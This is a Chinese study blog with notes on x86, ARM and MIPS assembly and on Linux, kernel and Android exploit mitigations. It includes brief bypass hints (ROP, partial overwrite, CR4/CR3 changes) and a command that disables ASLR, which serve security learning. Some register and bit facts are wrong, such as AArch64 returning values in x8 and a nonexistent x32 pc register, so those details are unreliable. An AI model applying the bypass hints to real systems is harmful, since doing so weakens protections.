<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 某些保护模式</span><br><span class="line">cr0-cr4</span><br></pre></td></tr></table></figure>

<ul>
<li>寻址</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov</span><br><span class="line">lea</span><br></pre></td></tr></table></figure>

<ul>
<li>算术指令</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 基本运算</span><br><span class="line">add</span><br><span class="line">sub</span><br><span class="line">mul</span><br><span class="line">div</span><br><span class="line">inc</span><br><span class="line">dec</span><br><span class="line"></span><br><span class="line">; 逻辑运算</span><br><span class="line">cmp</span><br><span class="line">and</span><br><span class="line">or</span><br><span class="line">xor</span><br><span class="line">not</span><br><span class="line"></span><br><span class="line">; 移位操作</span><br><span class="line">shl  ; shift left</span><br><span class="line">shr</span><br><span class="line">sal  ; shift arithmetic left 算数左移</span><br><span class="line">sar</span><br></pre></td></tr></table></figure>

<ul>
<li>跳转</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; jmp 类</span><br><span class="line">jmp</span><br><span class="line">jb   ; blow</span><br><span class="line">jg   ; greater</span><br></pre></td></tr></table></figure>

<ul>
<li>函数调用</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">call function</span><br><span class="line">; call 执行时，保存 eip+4, 并跳转到对应地址</span><br><span class="line">; 参数传递，使用栈传递参数</span><br></pre></td></tr></table></figure>

<ul>
<li>栈帧</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 在调用子程序时，会开辟子程序的栈帧。esp和ebp保存栈顶和栈底</span><br><span class="line">; 在返回父程序需要还原esp, ebp指针。</span><br><span class="line">; 栈 低地址生长</span><br><span class="line"></span><br><span class="line">; sp自动变化</span><br><span class="line">push ebx  ; sp-4</span><br><span class="line">pop rax   ; sp+4</span><br></pre></td></tr></table></figure>

<ul>
<li>系统调用</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 系统中断处理syscall</span><br><span class="line">int 0x80            ; eax系统调用号 ebx, ecx, edx对应函数前三个参数</span><br></pre></td></tr></table></figure>


<h3 id="x86-64"><a href="#x86-64" class="headerlink" title="x86-64"></a>x86-64</h3><ul>
<li><p>实际上x86-64与AMD64基本是同一个ISA，现在我们使用购买的Intel或者AMD生产的CPU，都属于x86-64的ISA。</p>
</li>
<li><p>x86-64: 64位，可寻址 <code>2^64</code>, 兼容x86</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 32位 r-&gt;b比如 rax-&gt;eax</span><br><span class="line">rax, rbx, rcx, rdx</span><br><span class="line">rsi, rdi</span><br><span class="line">rsp, rbp</span><br><span class="line">r8: r8d 32位 寄存器，低32位</span><br><span class="line">r9: r9d</span><br><span class="line">r10: ...</span><br><span class="line">r11: ...</span><br><span class="line">r12: ...</span><br><span class="line">r13: ...</span><br><span class="line">r14: ...</span><br><span class="line">r15: ...</span><br></pre></td></tr></table></figure>


<ul>
<li>Linux下函数调用约定, 与x86相差较大</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 函数参数</span><br><span class="line">rdi, rsi, rdx, rcx, r8, r9           ; 传递前6个参数，第7个参数开始和x86一样使用栈传递</span><br><span class="line"></span><br><span class="line">; 返回值</span><br><span class="line">rax</span><br></pre></td></tr></table></figure>

<ul>
<li>系统调用</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; syscall</span><br><span class="line">rax: 系统调用号</span><br><span class="line">; 参数传递与函数一致， rdi, rsi...</span><br></pre></td></tr></table></figure>

<h2 id="ARM"><a href="#ARM" class="headerlink" title="ARM"></a>ARM</h2><ul>
<li><p>RISC</p>
</li>
<li><p>ARM指令格式</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">label op-code oprand1 oprand2 oprand3 ...        @commit</span><br><span class="line"></span><br><span class="line">@ 更加学术 rd: destination; rn: 寄存器中用于算术运算的操作数; shifter_operand: 数据处理指令</span><br><span class="line">&lt;opcode&gt; &#123;&lt;cond&gt;&#125; &#123;S&#125; &lt;rd&gt;,&lt;rn&gt;,&lt;shifter_operand&gt;</span><br><span class="line"></span><br><span class="line">@ 注释  `@`, `//`  `/**/` `;`</span><br></pre></td></tr></table></figure>

<h3 id="ARMv7"><a href="#ARMv7" class="headerlink" title="ARMv7"></a>ARMv7</h3><ul>
<li><p>32位指令集<code>A32</code>，兼容16位指令集<code>T16</code></p>
<ul>
<li>由于ARMv7 兼容 <code>ARM</code>和 <code>Thumb</code>指令集，区分两个指令集： <code>addr &amp; 1 == 1</code>代表<code>thumb</code>指令集</li>
</ul>
</li>
<li><p>ARMv7通用寄存器</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">r0-r3: args, 函数前四个参数，返回值也会存入r0. </span><br><span class="line">r4-r10:  </span><br><span class="line">r11: fp, frame pointer</span><br><span class="line">r12: ip, Intra-Procedure-call scratch register, 在新版本当作通用寄存器使用，会在bl时引发bug</span><br><span class="line">r13: sp, stack pointer</span><br><span class="line">r14: lr, link register</span><br><span class="line">r15: pc, program count, 指向下一条需要执行的指令</span><br></pre></td></tr></table></figure>

<ul>
<li>标志位(CPSR: program status reg),如果想改变，需要在某些指令后加 <code>s</code> (sub -&gt; subs)</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">N: negative, 运算结果&gt;=0 N=0, 负数，N=1</span><br><span class="line">Z: zero, 为0</span><br><span class="line">C: carry, 进位</span><br><span class="line">V: overflow 有溢出</span><br><span class="line"></span><br><span class="line">; cmp 可以改变</span><br><span class="line">cmp r0, r1</span><br></pre></td></tr></table></figure>

<ul>
<li>mov 立即数</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov r0, #1     @ r0 &lt;- 1</span><br><span class="line"></span><br><span class="line">@ 特殊寄存器 cpsr || spsr</span><br><span class="line">mrs r0, cpsr   @ r0 &lt;- cpsr</span><br><span class="line">msr cpsr, r1   @ cpsr &lt;- r1</span><br></pre></td></tr></table></figure>

<ul>
<li>访问内存</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@ 不能直接像intel mov访问内存, 使用 load, store命令间接访问内存</span><br><span class="line">ldr rd, [rn , #offset]   @ load register</span><br><span class="line">str rd, [rn, #offset]</span><br><span class="line">ldm                      @ load multiple</span><br><span class="line">stm  </span><br><span class="line"></span><br><span class="line">; 例子</span><br><span class="line">ldr r0, =0X20000002  @ r0=0X20000002，加载地址到寄存器 </span><br><span class="line">str r1, [r0]         @ r1 中的值写入到 r0 中所保存的地址中</span><br></pre></td></tr></table></figure>

<ul>
<li>算术指令</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@ 基本算数运算</span><br><span class="line">add rd, rn, rm   @ rd = rn + rm</span><br><span class="line">sub rd, rn, rm   @ rd = rn - rm</span><br><span class="line">mul rd, rn, rm   @ rd = rn * rm</span><br><span class="line">sdiv rd, rn, rm  @ rd = rn / rm, s(ign)div u(nsign)div</span><br><span class="line"></span><br><span class="line">@ 想改变标志位, 加 &#x27;s&#x27; =&gt; subs...</span><br><span class="line"></span><br><span class="line">@ 逻辑运算</span><br><span class="line">and rd, rn       @ rd = rd &amp; rn</span><br><span class="line">and rd, rn, #imm @ rd = rn &amp; #imm</span><br><span class="line">orr rd, rn       @ rd = rd | rn</span><br><span class="line">eor rd, rn       @ rd = rd ^ rn</span><br><span class="line"></span><br><span class="line">@ 移位操作</span><br><span class="line">lsl   @ logic shift left 逻辑左移</span><br><span class="line">lsr   @ 逻辑右移</span><br><span class="line">asr   @ arithmetic shift right 算数右移</span><br><span class="line">ror   @ rotate right 循环右移</span><br></pre></td></tr></table></figure>


<ul>
<li>程序跳转</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b: 直接跳到label。 branch</span><br><span class="line">bx: 跳转+状态切换    @ ARM/Thumb 模式(使用一次，切换一次)</span><br><span class="line">bl: b + link, 首先保存下一条指令地址到lr, 然后改变pc。</span><br><span class="line">blx: bl+bx</span><br><span class="line"></span><br><span class="line">@ 条件跳转, 状态寄存器</span><br><span class="line">eq: equal 相等</span><br><span class="line">ne: not eq</span><br><span class="line">lt: less </span><br><span class="line">le: less equal</span><br></pre></td></tr></table></figure>

<ul>
<li>函数调用</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@ 仍然是使用 `b` 指令调用函数</span><br></pre></td></tr></table></figure>

<ul>
<li>栈帧相关</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@ sp, fp 维护栈帧的状态, 栈向 低地址生长</span><br><span class="line"></span><br><span class="line">fp -&gt; +-------+</span><br><span class="line">      | frame |</span><br><span class="line">sp -&gt; +-------+</span><br><span class="line"></span><br><span class="line">@ push/pop 可以操作多个寄存器，甚至可以控制pc; sp自动变化</span><br><span class="line">@ 下面是常见的函数调用出现出现的gadget </span><br><span class="line">push &#123;r0-r4, lr&#125;           @ 顺序是 push r12; push r4; push r3 ...</span><br><span class="line">...</span><br><span class="line">pop &#123;r0-r4, pc&#125;            @ 顺序是  pop r0; pop r1; ...</span><br><span class="line"></span><br><span class="line">@ 等价于 push, 先计算sp的值?</span><br><span class="line">stmfd sp!, &#123;r0-r4, r12&#125;</span><br><span class="line"></span><br><span class="line">@ 等价于 pop</span><br><span class="line">ldmfd sp!, lr</span><br></pre></td></tr></table></figure>

<ul>
<li>系统中断</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@ 通过vector_swi/svc 获得系统调用号</span><br><span class="line">swi #imm</span><br><span class="line">svc #imm</span><br><span class="line"></span><br><span class="line">@ O(old)ABI 形式</span><br><span class="line">mov r0, #34</span><br><span class="line">swi 12</span><br><span class="line"></span><br><span class="line">@ E(extended)ABI 形式，立即数 imm被忽略,由r0决定</span><br><span class="line">mov r0, #12</span><br><span class="line">mov r1, #34</span><br><span class="line">swi 0</span><br></pre></td></tr></table></figure>

<h3 id="ARMv8"><a href="#ARMv8" class="headerlink" title="ARMv8"></a>ARMv8</h3><ul>
<li><p>与 <code>armv7</code> 存在一定的区别</p>
</li>
<li><p>64位指令集 <code>aarch64</code>, 兼容32位 <code>aarch32</code></p>
</li>
</ul>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">aarch64: 64-bit registers and memory accesses, new instruction set；</span><br><span class="line">aarch32: backwards compatible with ARMv7-A</span><br></pre></td></tr></table></figure>

<ul>
<li>ARMv8 通用寄存器</li>
</ul>
<figure class="highlight arm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">x0</span>-x31</span><br><span class="line"><span class="symbol">x0</span>-x7: 函数前<span class="number">8</span>个参数值</span><br><span class="line"><span class="symbol">x8:</span> 函数返回值</span><br><span class="line"><span class="symbol">x19</span>-x28: 没特殊用途 </span><br><span class="line"><span class="symbol">x29:</span> <span class="built_in">fp</span> frame pointer</span><br><span class="line"><span class="symbol">x30:</span> <span class="built_in">lr</span></span><br><span class="line"><span class="symbol">x31:</span> zr, zero register, 恒<span class="number">0</span></span><br><span class="line"><span class="symbol">x32:</span> <span class="built_in">pc</span>, 不能像armv7一样被修改</span><br><span class="line"></span><br><span class="line"><span class="comment">@ 也可使用32位的 w0...寄存器, 可扩展使用</span></span><br><span class="line"></span><br><span class="line"><span class="comment">@ sp对应的物理寄存器有如下四个(某一时刻只能对应下面其中一个)</span></span><br><span class="line"><span class="symbol">SP_EL0</span>和SP_EL1</span><br><span class="line"><span class="symbol">SP_EL2</span></span><br><span class="line"><span class="symbol">SP_EL3</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>SPSR 替代了 CPSR</p>
</li>
<li><p>内存访问</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@ load &amp; store, 兼容armv7 ldr</span><br><span class="line">ldp  @ load pair 一对。</span><br><span class="line">	ldp x8, x2, [x0, #0x10]   @ 将x8&lt;-(x0+0x10), x2&lt;-(x0+0x10+8)</span><br><span class="line">stp  @ store pair</span><br></pre></td></tr></table></figure>

<ul>
<li>函数</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@ 参数传递</span><br><span class="line">x0-x7: 函数前8个参数值</span><br><span class="line">x8: 函数返回值</span><br><span class="line"></span><br><span class="line">@ aarch64没有push和pop 指令</span><br></pre></td></tr></table></figure>

<ul>
<li>系统调用</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@ supervisor call</span><br><span class="line">svc #imm</span><br></pre></td></tr></table></figure>

<ul>
<li>TrustZone 相关<br>xxx</li>
</ul>
<h3 id="ARMv9"><a href="#ARMv9" class="headerlink" title="ARMv9"></a>ARMv9</h3><p>xxx</p>
<h2 id="Mips"><a href="#Mips" class="headerlink" title="Mips"></a>Mips</h2><ul>
<li><p>RISC， <code>Microprocessor without Interlocked Pipeline Stages</code></p>
</li>
<li><p><code>mips</code> 是<code>big-endian</code>, mipsel是 <code>little-endian</code></p>
</li>
<li><p>格式</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 根据位数</span><br><span class="line">31-26   25-21 20-16 15-11  10-6  5-0</span><br><span class="line">op-code   rs    rt   rd    shamt func</span><br><span class="line"></span><br><span class="line"># 注释使用 `#`</span><br><span class="line"></span><br><span class="line">rd: register destination</span><br><span class="line">rt: target</span><br><span class="line">rs: source</span><br></pre></td></tr></table></figure>

<ul>
<li>通用寄存器， 32个</li>
</ul>
<figure class="highlight mips"><table><tr><td class="code"><pre><span class="line">$<span class="number">0</span>-$<span class="number">31</span>          <span class="comment"># 有各自的助记符，看汇编时多使用助记符</span></span><br><span class="line"><span class="symbol">$0:</span>    $<span class="built_in">zero</span>    <span class="comment"># 恒0</span></span><br><span class="line"><span class="number">1</span>:     $<span class="built_in">at</span>      # </span><br><span class="line"><span class="number">2</span><span class="number">-3</span>:   $<span class="built_in">v0</span>-<span class="built_in">v1</span>   <span class="comment"># value 函数返回值</span></span><br><span class="line"><span class="number">4</span><span class="number">-7</span>:   $<span class="built_in">a0</span>-<span class="built_in">a3</span>   <span class="comment"># arg  函数参数</span></span><br><span class="line"><span class="number">8</span><span class="number">-15</span>:  $<span class="built_in">t0</span>-<span class="built_in">t7</span>   <span class="comment"># temp</span></span><br><span class="line"><span class="number">16</span><span class="number">-23</span>: $<span class="built_in">s0</span>-<span class="built_in">s7</span>   <span class="comment"># save 保留</span></span><br><span class="line"><span class="number">24</span><span class="number">-25</span>: $<span class="built_in">t8</span>-<span class="built_in">t9</span>   <span class="comment"># temp</span></span><br><span class="line"><span class="number">16</span><span class="number">-27</span>: $<span class="built_in">k0</span>-<span class="built_in">k1</span>   <span class="comment"># 异常或中断</span></span><br><span class="line"><span class="number">28</span>:    $<span class="built_in">gp</span>      <span class="comment"># global pointer</span></span><br><span class="line"><span class="number">29</span>:    $<span class="built_in">sp</span>      <span class="comment"># stack pointer</span></span><br><span class="line"><span class="number">30</span>:    $<span class="built_in">fp</span>, <span class="built_in">s8</span>  <span class="comment"># frame pointer </span></span><br><span class="line"><span class="number">31</span>:    $<span class="built_in">ra</span>      <span class="comment"># ret addr</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; 特殊</span></span><br><span class="line"><span class="symbol">pc:</span> program cunter</span><br></pre></td></tr></table></figure>

<ul>
<li>指令格式</li>
</ul>
<figure class="highlight mips"><table><tr><td class="code"><pre><span class="line">r: register format <span class="comment"># 使用寄存器</span></span><br><span class="line">i: immediate       <span class="comment"># 使用立即数</span></span><br><span class="line"><span class="keyword">j: </span><span class="keyword">jump</span></span><br></pre></td></tr></table></figure>

<ul>
<li>寻址</li>
</ul>
<figure class="highlight mips"><table><tr><td class="code"><pre><span class="line"><span class="keyword">move </span>$<span class="built_in">a0</span>, $<span class="built_in">zero</span>    <span class="comment"># a0&lt;-0</span></span><br></pre></td></tr></table></figure>

<ul>
<li>访问内存</li>
</ul>
<figure class="highlight mips"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 仍然 load, store</span></span><br><span class="line"><span class="comment"># b: byte; w: word; h: half word; ...</span></span><br><span class="line"><span class="keyword">sw: </span><span class="keyword">sw </span>$<span class="built_in">ra</span>, <span class="number">0x38</span>($<span class="built_in">sp</span>)   <span class="comment"># 将$ra存入栈中 $sp+38的地方</span></span><br><span class="line"><span class="keyword">sb: </span>...</span><br><span class="line"><span class="keyword">lw: </span>...</span><br><span class="line"><span class="keyword">lb: </span>...</span><br><span class="line"></span><br><span class="line"><span class="comment"># 例子</span></span><br><span class="line"><span class="keyword">sb </span>r1, <span class="number">0</span>(R2)</span><br><span class="line"><span class="keyword">lb </span>r1, <span class="number">0</span>(r2)</span><br></pre></td></tr></table></figure>

<ul>
<li>算术</li>
</ul>
<figure class="highlight mips"><table><tr><td class="code"><pre><span class="line"><span class="comment">; 基本算术</span></span><br><span class="line"><span class="keyword">add</span></span><br><span class="line"><span class="keyword"></span><span class="keyword">sub</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="comment">; 逻辑</span></span><br><span class="line"><span class="keyword">or</span></span><br><span class="line"><span class="keyword"></span><span class="keyword">xor</span></span><br><span class="line"><span class="keyword"></span><span class="keyword">nor</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="comment">; 移位</span></span><br><span class="line"><span class="keyword">sll</span></span><br><span class="line"><span class="keyword"></span><span class="keyword">srl</span></span><br></pre></td></tr></table></figure>

<ul>
<li>跳转</li>
</ul>
<figure class="highlight mips"><table><tr><td class="code"><pre><span class="line"><span class="comment">; jmp</span></span><br><span class="line"><span class="keyword">j: </span><span class="keyword">jmp </span>label</span><br><span class="line"><span class="keyword">jr: </span>用法 <span class="keyword">jr </span>$<span class="built_in">ra</span> 等</span><br><span class="line"><span class="keyword">jal: </span><span class="keyword">jmp </span><span class="keyword">and </span>link, 保存 ret <span class="keyword">addr(pc+4) </span>到 $<span class="built_in">ra</span></span><br><span class="line"><span class="keyword">jalr: </span>借用寄存器跳转，链接，常用</span><br><span class="line"></span><br><span class="line"><span class="comment">; branch, 后面需要跟操作</span></span><br><span class="line"><span class="keyword">beq: </span><span class="keyword">beq </span>$s, $t, offset   <span class="comment"># $s=$t跳转</span></span><br><span class="line"><span class="keyword">bne: </span><span class="keyword">b </span>not eq</span><br><span class="line"><span class="keyword">bltz: </span><span class="keyword">branch </span>less than <span class="built_in">zero</span></span><br></pre></td></tr></table></figure>

<ul>
<li>架构缓存<ul>
<li>有两个独立的cache: 指令 和 数据</li>
</ul>
</li>
</ul>
<h2 id="RISC-V"><a href="#RISC-V" class="headerlink" title="RISC-V"></a>RISC-V</h2><p>xxx</p>
]]></content>
      <categories>
        <category>CS</category>
      </categories>
      <tags>
        <tag>asm</tag>
      </tags>
  </entry>
  <entry>
    <title>程序保护机制</title>
    <url>/2023/08/26/%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</url>
    <content><![CDATA[<blockquote>
<p>程序保护机制学习</p>
</blockquote>
<span id="more"></span>

<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="ELF"><a href="#ELF" class="headerlink" title="ELF"></a>ELF</h3><h4 id="relro"><a href="#relro" class="headerlink" title="relro"></a>relro</h4><p>read only relocation: 由linker指定binary的一块经过dynamic linker处理过 relocation之后的区域为只读.</p>
<ul>
<li>比如说 got表，在完全开启后只读，我们无法修改修改函数 got 表的内容从而改变函数的执行过程。</li>
</ul>
<p>gcc 选项</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-z norelro   <span class="comment"># 关闭</span></span><br><span class="line">-z lazy      <span class="comment"># 部分开启</span></span><br><span class="line">-z now       <span class="comment"># 完全开启</span></span><br></pre></td></tr></table></figure>

<h4 id="aslr"><a href="#aslr" class="headerlink" title="aslr"></a>aslr</h4><p>Address Space Layout Randomization, 这种技术使得系统上运行的进程的内存地址无法被预测，使得与这些进程有关的漏洞变得更加难以利用。配合 PIE 保护从而得到最好的效果</p>
<p>Linux上ASLR分为0&#x2F;1&#x2F;2三级，用户可以通过内核参数randomize_va_space进行等级控制，对应效果如下：</p>
<ul>
<li>0：没有随机化，即关闭ASLR</li>
<li>1：保留的随机化，即<strong>共享库、栈、mmap()以及VSDO将被随机化</strong></li>
<li>2：完全的随机化，在1的基础上，<strong>通过brk分配的内存空间(heap通过此系统调用获得)也将随机化</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cat</span>  /proc/sys/kernel/randomize_va_space</span><br><span class="line">  2</span><br><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure>

<p>在使用 gdb 软件调试时可以关闭此保护，从而在调试时获得的地址一致。</p>
<p>因为存在一定的地址随机化，所以在漏洞利用时不能使用固定的函数地址。比如没开 aslr 保护system函数(共享库中的函数)地址是 0x1234。开启aslr时system函数位置会改变，从而利用失败。</p>
<h4 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h4><p>No-eXecute 不可执行。和DEP(Data Execute Protector)一致</p>
<p>将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</p>
<p>gcc参数</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-z execstack    <span class="comment"># 栈可执行</span></span><br><span class="line">-z noexecstack  <span class="comment"># 开启</span></span><br></pre></td></tr></table></figure>

<p>bypass: 杜绝了一定写shellcode的利用，但是可以使用**ROP(Return-oriented programming)**来bypass，造成我们想要的攻击效果。</p>
<h4 id="pie"><a href="#pie" class="headerlink" title="pie"></a>pie</h4><p>Position independent code, 位置无关代码，默认开启。<br>针对代码段.text, 数据段，.data，.bss等固定地址的一个防护技术。同ASLR一样，应用了PIE的程序会在每次加载时都变换加载基址，从而使位于程序本身的gadget也失效</p>
<p>没有PIE保护的程序，每次加载的基址都是固定的，64位上一般是0x400000。</p>
<p>gcc 参数</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-no-pie    <span class="comment"># 关闭pie</span></span><br><span class="line">-pie       <span class="comment"># 开启pie</span></span><br></pre></td></tr></table></figure>

<p>开启aslr，我们可以获得text段的gadget，并且可以使用。但是开其pie保护后，text随机化，我们寻找的gadget也需要加上一个偏移才能使用。</p>
<ul>
<li>bypass<ul>
<li>partial write: 由于内存的页载入机制，PIE的随机化只能<strong>影响到单个内存页</strong>。通常来说，一个内存页大小为0x1000，这就意味着不管地址怎么变，某条指令的后12位是始终不变的。因此通过覆盖部分内容比如后8位从而劫持函数执行流。<ul>
<li>leak: 程序本身的漏洞可以泄露某些函数地址，从而获得程序加载的基地址。</li>
</ul>
</li>
<li>vdso&#x2F;vsyscall: 系统把几个常用的无参内核调用从内核中映射到用户空间中，这就是vsyscall。在某些版本中，这个地址不会改变，并且不受保护的影响。vsyscall 内存页中包含了三个系统调用。而且这三个系统调用对程序运行基本没有影响，也就是说我们获得了三个已知地址的 ret。相当可以执行 <code>ret</code> 指令，获得：查看程序的映射 <code>cat /proc/&lt;pid&gt;/maps</code>。</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__vsyscall_page:</span><br><span class="line"> mov $__NR_gettimeofday, %rax</span><br><span class="line"> syscall</span><br><span class="line"> ret</span><br><span class="line"></span><br><span class="line"> .balign <span class="number">1024</span>, <span class="number">0xcc</span></span><br><span class="line"> mov $__NR_time, %rax</span><br><span class="line"> syscall</span><br><span class="line"> ret</span><br><span class="line"></span><br><span class="line"> .balign <span class="number">1024</span>, <span class="number">0xcc</span></span><br><span class="line"> mov $__NR_getcpu, %rax</span><br><span class="line"> syscall</span><br><span class="line"> ret</span><br></pre></td></tr></table></figure>

<h4 id="stack-canary"><a href="#stack-canary" class="headerlink" title="stack canary"></a>stack canary</h4><p>当启用 canary 保护后，函数开始执行的时候会先往栈里<strong>插入 cookie 信息</strong>，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在栈溢出覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。</p>
<p>Linux canary 最后一字节为 <code>\x00</code></p>
<p>gcc 开启和关闭的参数</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-fno-stack-protector   <span class="comment"># 关闭，默认没有canary</span></span><br><span class="line"></span><br><span class="line">-fstack-protector          <span class="comment"># 保护函数中通过alloca()分配缓存以及存在大于8字节的buffer。保护能力有限，不会保护所有的函数</span></span><br><span class="line">-fstack-protector-all      <span class="comment"># 启用堆栈保护，为所有函数插入保护代码</span></span><br><span class="line">-fstack-protector-strong   <span class="comment"># 编译参数让保护的范围更广</span></span><br></pre></td></tr></table></figure>

<h3 id="kernel"><a href="#kernel" class="headerlink" title="kernel"></a>kernel</h3><h4 id="kaslr"><a href="#kaslr" class="headerlink" title="kaslr"></a>kaslr</h4><p>kernel address space layout randomize</p>
<p>在开启了 KASLR 的内核中，内核的代码段基地址等地址会整体偏移。</p>
<h4 id="smap"><a href="#smap" class="headerlink" title="smap"></a>smap</h4><p>Supervisor Mode Access Prevention，管理模式访问保护。</p>
<p>如果内核态可以访问用户态的数据，也会出现问题。比如在劫持控制流后，攻击者可以通过栈迁移将栈迁移(pop rsp类似的指令)到用户态，然后进行 ROP，进一步达到提权的目的。</p>
<p>在 Linux 内核中，这个防御措施的实现是与<strong>指令集架构相关</strong>的。x86 下对应的保护机制的名字为 SMAP。CR4 寄存器中的第 21 位用来标记是否开启 SMEP 保护。</p>
<ul>
<li>bypass: 修改cr4</li>
</ul>
<h4 id="smep"><a href="#smep" class="headerlink" title="smep"></a>smep</h4><p>Supervisor Mode Execution Prevention，管理模式执行保护。</p>
<p>在内核态执行代码时，可以直接执行用户态的代码。那如果攻击者<strong>控制了内核中的执行流，就可以执行处于用户态的代码</strong>。由于用户态的代码是攻击者可控的，所以更容易实施攻击。为了防范这种攻击，研究者提出当位于内核态时，不能执行用户态的代码。</p>
<p>在 Linux 内核中，这个防御措施的实现是与<strong>指令集架构相关</strong>的(ARM PXN)。x86下 <code>CR4</code> 寄存器中的第 20 位用来标记是否开启 SMEP 保护。</p>
<p>查看是否开启</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep smap /proc/cpuinfo  <span class="comment"># 如果出现结果，说明开启</span></span><br></pre></td></tr></table></figure>

<ul>
<li>bypass: 修改cr4</li>
</ul>
<h4 id="kpti"><a href="#kpti" class="headerlink" title="kpti"></a>kpti</h4><p>Kernel Page Table Isolation，内核页表隔离</p>
<p>在 x86_64 的 PTI 机制中，<strong>内核态的用户空间内存映射部分被全部标记为不可执行</strong>。也就是说，之前不具有 SMEP 特性的硬件，如果开启了 KPTI 保护，也具有了类似于 SMEP 的特性。此外，SMAP 模拟也可以以类似的方式引入，只是现在还没有引入。因此，在目前开启了 KPTI 保护的内核中，如果没有开启 SMAP 保护，那么内核仍然可以访问用户态空间的内存，只是不能跳转到用户态空间执行 Shellcode。</p>
<ul>
<li>bypass<ul>
<li>signal handler</li>
<li>change cr3<ul>
<li>swapgs_restore_regs_and_return_to_usermode 函数中存在可以改变 cr3 的gadget</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="fgkaslr"><a href="#fgkaslr" class="headerlink" title="fgkaslr"></a>fgkaslr</h4><p>FGKASLR 在 KASLR 基地址随机化的基础上，在加载时刻，以函数粒度重新排布内核代码。目前，FGKASLR 只支持 <strong>x86_64</strong> 架构。</p>
<p>FGKASLR 利用 gcc 的编译选项 <code>-ffunction-sections</code> 把内核中不同的函数放到不同的 section 中。 在编译的过程中，任何使用 C 语言编写的函数以及不在特殊输入节的函数都会单独作为一个节；使用汇编编写的代码会位于一个统一的节中。</p>
<p>如果想要开启内核的 FGKASLR，你需要开启 <code>CONFIG_FG_KASLR=y</code> 选项。</p>
<h4 id="Kernel-Stack-Canary"><a href="#Kernel-Stack-Canary" class="headerlink" title="Kernel Stack Canary"></a>Kernel Stack Canary</h4><p>在编译内核时，我们可以设置 CONFIG_CC_STACKPROTECTOR 选项，来开启该保护</p>
<p>在 x86 架构中，同一个 task 中使用相同的 Canary。</p>
<h2 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h2><blockquote>
<p>安卓使用 Linux Kernel，有些保护并非特有，而是是否默认开启。</p>
</blockquote>
<h3 id="pxn"><a href="#pxn" class="headerlink" title="pxn"></a>pxn</h3><p>Privileged Execute-Never。内核安全特性，用来阻止内核直接执行用户空间的代码，能够极大地提升漏洞利用的难度。</p>
<p>和 smep 一个性质</p>
<h3 id="pan"><a href="#pan" class="headerlink" title="pan"></a>pan</h3><p>smap 类似的性质</p>
<h3 id="cfi"><a href="#cfi" class="headerlink" title="cfi"></a>cfi</h3><p>Control-Flow Integrity 控制流完整性</p>
<p>其核心思想是<strong>限制程序运行中的控制转移，使之始终处于原有的控制流图所限定的范围内</strong>。具体做法是通过分析程序的控制流图，获取间接转移指令（包括间接跳转、间接调用、和函数返回指令）目标的白名单，并在运行过程中，核对间接转移指令的目标是否在白名单中。控制流劫持攻击往往会违背原有的控制流图，CFI使得这种攻击行为难以实现，从而保障软件系统的安全。</p>
<p>内核 CFI 手动启用，x86通过此开启</p>
